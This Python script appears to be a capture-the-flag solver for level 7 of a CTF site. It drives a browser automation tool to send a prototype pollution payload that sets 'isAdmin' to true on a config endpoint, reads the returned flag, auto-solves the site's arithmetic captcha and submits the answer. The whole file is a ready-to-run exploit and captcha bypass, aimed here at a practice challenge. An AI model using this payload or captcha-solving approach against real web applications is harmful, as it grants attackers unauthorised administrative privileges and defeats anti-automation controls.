import argparse
import json
import os
import re
import shutil
import subprocess
import sys


DEFAULT_CONFIG_PATH = "/api/levels/7/config"
DEFAULT_ANSWER_PATH = "/api/levels/7/answer"
DEFAULT_CAPTCHA_PATH = "/api/captcha"
DEFAULT_PAYLOAD = '{"__proto__":{"isAdmin":true}}'


def resolve_agent_browser() -> str:
    env_value = os.environ.get("AGENT_BROWSER_BIN")
    if env_value:
        return env_value

    exe_candidate = os.path.expandvars(
        r"%APPDATA%\npm\node_modules\agent-browser\bin\agent-browser-win32-x64.exe"
    )
    if os.path.exists(exe_candidate):
        return exe_candidate

    for candidate in ("agent-browser", "agent-browser.ps1", "agent-browser.cmd"):
        resolved = shutil.which(candidate)
        if resolved:
            return resolved

    raise FileNotFoundError("agent-browser executable not found")


def run_agent(*args: str) -> str:
    result = subprocess.run(
        [resolve_agent_browser(), *args],
        capture_output=True,
        text=True,
        encoding="utf-8",
    )
    if result.returncode != 0:
        raise RuntimeError(
            f"agent-browser failed ({result.returncode})\nSTDOUT:\n{result.stdout}\nSTDERR:\n{result.stderr}"
        )
    return result.stdout.strip()


def list_tabs() -> str:
    return run_agent("tab", "list")


def find_ctf_tab() -> int | None:
    output = list_tabs()
    candidates: list[int] = []
    for line in output.splitlines():
        line = line.strip()
        if not (line.startswith("[") or line.startswith("→ [")):
            continue
        if "https://ctf.centos.hk/" not in line:
            continue

        start = line.find("[")
        end = line.find("]", start + 1)
        if start == -1 or end == -1:
            continue
        candidates.append(int(line[start + 1 : end]))
    return candidates[-1] if candidates else None


def switch_tab(tab: int | None) -> None:
    target = tab if tab is not None else find_ctf_tab()
    if target is not None:
        run_agent("tab", str(target))


def browser_eval(js: str) -> str:
    return run_agent("eval", js)


def browser_fetch_json(path: str, method: str = "GET", body: str | None = None) -> dict:
    js = (
        "(async()=>{"
        f"const options={{method:{json.dumps(method)},headers:{{'Content-Type':'application/json'}}"
        + (f",body:{json.dumps(body)}" if body is not None else "")
        + "};"
        f"const response=await fetch({json.dumps(path)},options);"
        "return JSON.stringify(await response.json());"
        "})()"
    )
    raw = browser_eval(js)
    parsed = json.loads(raw)
    if isinstance(parsed, str):
        parsed = json.loads(parsed)
    return parsed


def solve_captcha(question: str) -> int:
    match = re.search(r"(-?\d+)\s*([+\-*/xX])\s*(-?\d+)", question)
    if not match:
        raise ValueError(f"unsupported captcha: {question}")

    left = int(match.group(1))
    operator = match.group(2)
    right = int(match.group(3))

    if operator == "+":
        return left + right
    if operator == "-":
        return left - right
    if operator in ("*", "x", "X"):
        return left * right
    if operator == "/":
        return left // right
    raise ValueError(f"unsupported captcha operator: {question}")


def normalize_flag(value: str) -> str:
    text = value.strip()
    match = re.fullmatch(r"muyuan\{(.+)\}", text)
    return match.group(1) if match else text


def exploit(config_path: str, payload: str) -> dict:
    return browser_fetch_json(config_path, method="POST", body=payload)


def submit_answer(flag: str, captcha_path: str, answer_path: str) -> dict:
    captcha = browser_fetch_json(captcha_path)
    captcha_answer = solve_captcha(captcha["question"])
    body = json.dumps(
        {
            "answer": f"muyuan{{{normalize_flag(flag)}}}",
            "captchaId": captcha["id"],
            "captchaAnswer": captcha_answer,
        },
        ensure_ascii=False,
    )
    return browser_fetch_json(answer_path, method="POST", body=body)


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(description="Level 7 prototype pollution helper")
    parser.add_argument("--tab", type=int)
    parser.add_argument("--config-path", default=DEFAULT_CONFIG_PATH)
    parser.add_argument("--answer-path", default=DEFAULT_ANSWER_PATH)
    parser.add_argument("--captcha-path", default=DEFAULT_CAPTCHA_PATH)
    parser.add_argument("--payload", default=DEFAULT_PAYLOAD)
    parser.add_argument("--submit-level-answer", action="store_true")
    return parser


def main() -> int:
    parser = build_parser()
    args = parser.parse_args()
    switch_tab(args.tab)

    exploit_result = exploit(args.config_path, args.payload)
    output: dict = {"exploit": exploit_result}

    flag = exploit_result.get("flag")
    if args.submit_level_answer and flag:
        output["levelSubmit"] = submit_answer(flag, args.captcha_path, args.answer_path)

    print(json.dumps(output, ensure_ascii=False, indent=2))
    return 0


if __name__ == "__main__":
    sys.exit(main())
